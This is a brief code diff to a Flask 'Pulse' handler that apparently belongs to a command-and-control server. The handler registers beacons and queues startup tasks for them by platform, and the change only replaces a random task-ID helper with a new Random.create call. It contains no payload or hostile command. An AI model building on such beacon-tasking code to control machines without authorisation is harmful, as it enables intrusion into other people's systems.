@@ -1,7 +1,7 @@
 from flask import request
 from app.models import StartupTasks, Tasks
 from app.validators import Existance
-from app.operations import Beacon, Result, Task
+from app.operations import Beacon, Result, Task, Random
 from app.functions_generic import Generic
 import magic, base64, os, datetime, json
 from io import StringIO
@@ -16,7 +16,7 @@ class Pulse:
                 post_data['data'], post_data['working_dir'], remote_ip)
             startup_tasks = StartupTasks.objects(platform=post_data['platform'])
             for tasks in startup_tasks:
-                task_id = Generic.create_random(10)
+                task_id = Random.create(10)
                 create_tasks = Tasks.create(beacon_id, tasks.command.name, tasks.input, task_id)
 
         if post_data['timer'] is not None:
